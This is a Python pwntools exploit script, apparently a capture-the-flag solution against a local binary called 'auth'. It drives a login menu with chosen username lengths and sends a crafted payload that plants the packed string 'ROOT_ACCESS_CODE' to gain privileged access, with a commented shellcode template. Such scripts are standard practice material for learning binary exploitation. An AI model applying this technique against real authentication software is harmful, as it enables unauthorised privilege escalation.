#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./auth
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./auth')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x{exe.symbols.main:x}
heap-analysis-helper

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

"""
login
print-flag
logout
quit
"""

io = start()
io.recvuntil(">")

length = 31
io.sendline("login")
io.recvuntil("Please enter the length of your username")
io.sendline(str(length))
io.recvuntil("Please enter your username")
payload  = ""
payload += cyclic(length)

payload  = "A"*8
payload += p64(0x4343415f544f4f52)
payload += p64(0x45444f435f535345)

io.sendline(payload)
io.recvuntil(">")
io.sendline("logout")

length = 100
io.sendline("login")
io.recvuntil("Please enter the length of your username")
io.sendline(str(length))
io.recvuntil("Please enter your username")
payload = ""
payload += cyclic(length)
io.sendline(payload)
io.recvuntil(">")


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

